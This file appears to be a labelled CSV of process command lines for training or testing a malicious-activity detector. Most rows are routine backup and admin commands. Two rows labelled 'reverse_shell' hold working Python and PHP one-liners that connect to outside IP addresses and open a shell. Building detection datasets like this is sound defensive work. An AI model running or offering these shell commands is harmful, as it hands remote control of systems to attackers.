process_name,command_line,label,attack_type
pg_dump,pg_dump -h 10.23.157.102 -U automation -Fc -f /srv/backups/db/session_blob-7.28.7.dump --no-password customers,benign,benign
python3,python3 -m http.server 9001 --directory /srv/artifacts/payroll --bind 10.20.234.156,benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/manifest.crt -inkey /etc/ssl/manifest.key -out /srv/backups/certs/manifest.pfx -passout pass:53929587bfe0,benign,benign
python3,"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""185.153.63.238"",8443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([""/bin/sh""])'",malicious,reverse_shell
pg_dump,pg_dump -h 10.38.199.37 -U postgres -Fc -f /srv/backups/db/ledger_2024-0.14.9.dump --no-password customers,benign,benign
certutil.exe,certutil.exe -store My c18a7c0e17634f2b95c7fc723f961f8a,benign,benign
mysqldump,mysqldump --single-transaction --routines --triggers -u jenkins -p$DB_PASS billing > /srv/backups/payroll.sql,benign,benign
docker,docker exec -it ledger_2024-1ef0f55b791d3ce4bb8e85e63dc841bf /bin/bash -lc 'tail -f /var/log/app/current',benign,benign
openssl,openssl pkcs12 -export -in /etc/ssl/telemetry_batch.crt -inkey /etc/ssl/telemetry_batch.key -out /srv/backups/certs/telemetry_batch.pfx -passout pass:2ff8134dc12fbbc45615e8e2628cbd84,benign,benign
ldapsearch,"ldapsearch -x -H ldap://edge04.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,benign
php,"php -r '$s=fsockopen(""185.141.239.31"",1337);exec(""/bin/sh -i <&3 >&3 2>&3"");'",malicious,reverse_shell
mysqldump,mysqldump --single-transaction --routines --triggers -u sysadmin -p$DB_PASS billing > /srv/backups/session_blob.sql,benign,benign
docker,docker exec -it customer_db-1cf4ab443fb6b906 /bin/bash -lc 'tail -f /var/log/app/current',benign,benign
ansible-pull,"ansible-pull -U git@app05.prod.svc.cluster.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-9.6.1.reg /y,benign,benign
kubectl,kubectl exec -it deploy/ledger_2024 -n production -- /bin/sh -c 'rake db:migrate:status',benign,benign
pg_dump,pg_dump -h 10.2.193.52 -U build -Fc -f /srv/backups/db/snapshot-7.8.8.dump --no-password customers,benign,benign
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\archive_set C:\Backups\reg\archive_set-0.30.7.reg /y,benign,benign
socat,"socat TCP-LISTEN:5985,reuseaddr,fork TCP:10.40.236.90:5432",benign,benign
